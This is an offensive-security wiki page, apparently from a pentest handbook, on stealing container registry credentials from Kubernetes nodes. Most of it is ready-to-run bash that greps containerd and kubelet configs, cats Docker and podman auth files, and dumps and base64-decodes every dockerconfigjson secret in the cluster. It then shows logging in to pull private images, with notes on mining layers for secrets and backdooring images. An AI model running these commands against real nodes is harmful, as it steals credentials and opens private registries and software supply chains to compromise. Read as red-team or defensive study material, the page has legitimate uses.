---
title: "Image pull secret theft: stealing the registry credentials a node holds"
description: "Node runtimes store the credentials used to pull images, in containerd and CRI-O configuration, in the kubelet's merged pull secrets, and in Kubernetes dockerconfigjson secrets. An attacker on the node or with runtime access reads these to authenticate to private registries, pulling proprietary images and the secrets inside them."
keywords:
  - image pull secret
  - dockerconfigjson
  - registry credentials
  - kubelet
  - private registry
---

# Image pull secret theft

To pull private images, a node must hold registry credentials, and those credentials sit in predictable places: the runtime's own configuration, the kubelet's view of a pod's image-pull secrets, and Kubernetes `dockerconfigjson` secret objects. Stealing them gives registry access, which yields private images and the secrets those images contain, extending a node foothold into the supply chain.

## Where the credentials live

```bash
# containerd registry auth (host config or the legacy config.toml)
grep -ri -A3 'auth\|token\|password' /etc/containerd/config.toml \
  /etc/containerd/certs.d/*/hosts.toml 2>/dev/null
# CRI-O / cri auth file and the kubelet's merged config
cat /var/lib/kubelet/config.json 2>/dev/null
find /var/lib/kubelet -name 'config.json' -o -name '*.dockercfg' 2>/dev/null
# the node-wide docker/podman auth files
cat /root/.docker/config.json /run/user/*/containers/auth.json 2>/dev/null
# Kubernetes image-pull secrets, if the API is reachable with a token
kubectl get secret -A -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.metadata.namespace}/{.metadata.name}: {.data.\.dockerconfigjson}{"\n"}{end}' \
  | while read n b; do echo "$n"; echo "$b" | base64 -d; done
```

## Using the credentials

```bash
# the auth value is base64 user:token, not encryption
echo "<auth-string>" | base64 -d
docker login <registry> -u <user> -p <token>
docker pull <registry>/<private-repo>:<tag>          # then mine layers for more secrets
```

## Exploitation notes

- All of these files store credentials in base64, which is encoding; decoding yields the registry username and token directly.
- Cloud registry credentials are often short-lived tokens refreshed by a helper, so use them promptly; static registry passwords persist and are the more durable find.
- Registry access is a supply-chain foothold: pull private images and extract their baked secrets via [Secrets in image layers](../docker/images-and-registries/secrets-in-image-layers.md), and consider write scope for [Image backdooring](../docker/images-and-registries/image-backdooring.md).

## References

- [Kubernetes: pull image from a private registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
- [containerd: registry configuration](https://github.com/containerd/containerd/blob/main/docs/hosts.md)
- [HackTricks: Kubernetes secrets](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
